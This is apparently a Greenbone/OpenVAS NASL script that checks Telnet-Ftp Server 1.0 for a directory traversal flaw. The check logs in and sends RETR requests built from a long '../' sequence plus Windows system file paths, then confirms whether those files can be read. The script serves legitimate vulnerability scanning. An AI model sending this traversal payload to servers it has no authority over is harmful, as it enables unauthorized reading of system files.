if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803736" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2006-6240", "CVE-2006-6241" );
	script_bugtraq_id( 21339, 21340 );
	script_tag( name: "cvss_base", value: "4.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-08-19 10:32:03 +0530 (Mon, 19 Aug 2013)" );
	script_name( "Telnet-Ftp Server Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "FTP" );
	script_dependencies( "ftpserver_detect_type_nd_version.sc", "os_detection.sc" );
	script_require_ports( "Services/ftp", 21 );
	script_mandatory_keys( "ftp/telnet_ftp/detected", "Host/runs_windows" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/21339" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/21340" );
	script_tag( name: "summary", value: "The host is running Telnet-Ftp server and is prone to directory traversal
  vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send the crafted directory traversal attack request and check whether it
  is able to read the system file or not." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "insight", value: "The flaw exists due to error in handling of file names. It does not properly
  sanitise filenames containing directory traversal sequences that are received from an FTP server." );
	script_tag( name: "affected", value: "Telnet-Ftp Server version 1.0 (Build 1.218)" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary files on the
  affected application." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("ftp_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = ftp_get_port( default: 21 );
banner = ftp_get_banner( port: port );
if(!banner || ( !ContainsString( banner, "220 FTP Server ready" ) && !ContainsString( banner, "Telnet-Ftp Server" ) )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
kb_creds = ftp_get_kb_creds();
user = kb_creds["login"];
pass = kb_creds["pass"];
login_details = ftp_log_in( socket: soc, user: user, pass: pass );
if(!login_details){
	ftp_close( socket: soc );
	exit( 0 );
}
port2 = ftp_get_pasv_port( socket: soc );
if(!port2){
	ftp_close( socket: soc );
	exit( 0 );
}
soc2 = open_sock_tcp( port: port2, transport: get_port_transport( port ) );
if(!soc2){
	ftp_close( socket: soc );
	exit( 0 );
}
files = traversal_files( "Windows" );
for pattern in keys( files ) {
	file = files[pattern];
	file = "../../../../../../../../../../../../../../../../" + file;
	req = NASLString( "RETR ", file );
	send( socket: soc, data: NASLString( req, "\\r\\n" ) );
	res = ftp_recv_data( socket: soc2 );
	if(res && match = egrep( string: res, pattern: "(" + pattern + "|\\WINDOWS)", icase: TRUE )){
		ftp_close( socket: soc );
		close( soc2 );
		report = "Used request:  " + req + "\n";
		report += "Received data: " + match;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
ftp_close( socket: soc );
close( soc2 );
exit( 0 );

